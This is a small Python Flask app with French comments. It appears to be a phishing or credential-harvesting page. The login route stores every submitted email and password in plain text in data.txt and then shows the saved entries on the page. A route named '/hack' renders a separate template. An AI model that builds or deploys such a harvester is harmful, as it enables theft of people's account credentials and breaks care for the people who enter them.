from flask import Flask, render_template, request, redirect, url_for

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']

        with open("data.txt", "a", encoding="utf-8") as f:
            f.write(f"Email: {email}, Mot de passe: {password}\n")
        # Rediriger vers la page de login après POST pour éviter le double envoi
        return redirect(url_for('login'))

    # Pour GET, lire les entrées sauvegardées (si le fichier existe) et les passer au template
    logins = []
    try:
        with open("data.txt", "r", encoding="utf-8") as f:
            logins = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        logins = []

    return render_template('login.html', logins=logins)


@app.route('/hack')
def hack():
    return render_template('hack.html')

if __name__ == '__main__':
    app.run(debug=True)
